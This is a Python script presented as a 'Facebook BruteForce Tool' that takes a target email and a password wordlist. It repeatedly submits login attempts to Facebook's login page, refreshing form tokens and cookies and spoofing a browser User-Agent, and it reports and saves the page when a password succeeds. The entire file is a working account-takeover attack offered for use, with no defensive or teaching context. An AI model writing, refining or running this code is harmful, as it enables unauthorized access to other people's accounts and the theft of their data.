import os.path
import argparse
import requests
from bs4 import BeautifulSoup
import sys
import signal


PASSWORD_FILE = ""
MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
PAYLOAD = {}
COOKIES = {}


def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies


def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email

    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)

    if 'Find Friends' in r.text or 'Security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        print('\nPassword found is: ', password)
        return True

    return False


def read_password_file(password_file):
    with open(password_file, 'r') as file:
        return [line.strip() for line in file if len(line.strip()) >= MIN_PASSWORD_LENGTH]


def get_user_input():
    email = input('Enter Email/Username to target: ').strip()
    return email


def signal_handler(sig, frame):
    print("\nCtrl+C detected. Exiting gracefully.")
    sys.exit(0)


def main():
    global PASSWORD_FILE
    signal.signal(signal.SIGINT, signal_handler)

    parser = argparse.ArgumentParser(description='Facebook BruteForce Tool')
    parser.add_argument('--password-file', dest='password_file', required=True, help='Path to the password file')
    args = parser.parse_args()

    PASSWORD_FILE = args.password_file

    print('\n---------- Welcome To Facebook BruteForce ----------\n')

    if not os.path.isfile(PASSWORD_FILE):
        print("Password file is not exist: ", PASSWORD_FILE)
        sys.exit(0)

    password_data = read_password_file(PASSWORD_FILE)
    print("Password file selected: ", PASSWORD_FILE)

    email = get_user_input()

    for index, password in enumerate(password_data):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue

        print("Trying password [", index, "]: ", password)

        if is_this_a_password(email, index, password):
            break


if __name__ == "__main__":
    main()
